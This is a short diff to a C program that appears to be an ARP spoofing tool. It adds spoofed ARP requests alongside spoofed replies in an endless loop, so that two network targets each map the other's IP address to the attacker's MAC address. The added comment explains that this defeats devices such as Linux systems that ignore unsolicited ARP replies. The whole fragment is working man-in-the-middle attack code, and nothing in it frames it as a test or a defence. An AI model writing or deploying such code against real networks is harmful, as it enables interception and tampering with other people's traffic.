@@ -138,9 +138,15 @@ int main(int argc, char **argv)
     	 macaddr2[0],macaddr2[1],macaddr2[2],
     	 macaddr2[3],macaddr2[4],macaddr2[5]);
 
+  /* We send ARP requests and replies to both targets, impersonating
+     the other. We use both requests and replies because some devices
+     (linux > 2.4.x for example) don't update their ARP cache on
+     unsolicited replies, but do on queries. */
   while(1) {
+    send_arp_request(sockfd, ifindex, ipaddr1, macaddr, target2_ip);
     send_arp_reply(sockfd, ifindex, ipaddr1, macaddr, target2_ip, macaddr2);
     sleep(1);
+    send_arp_request(sockfd, ifindex, ipaddr2, macaddr, target1_ip);
     send_arp_reply(sockfd, ifindex, ipaddr2, macaddr, target1_ip, macaddr1);
     sleep(1);
   }
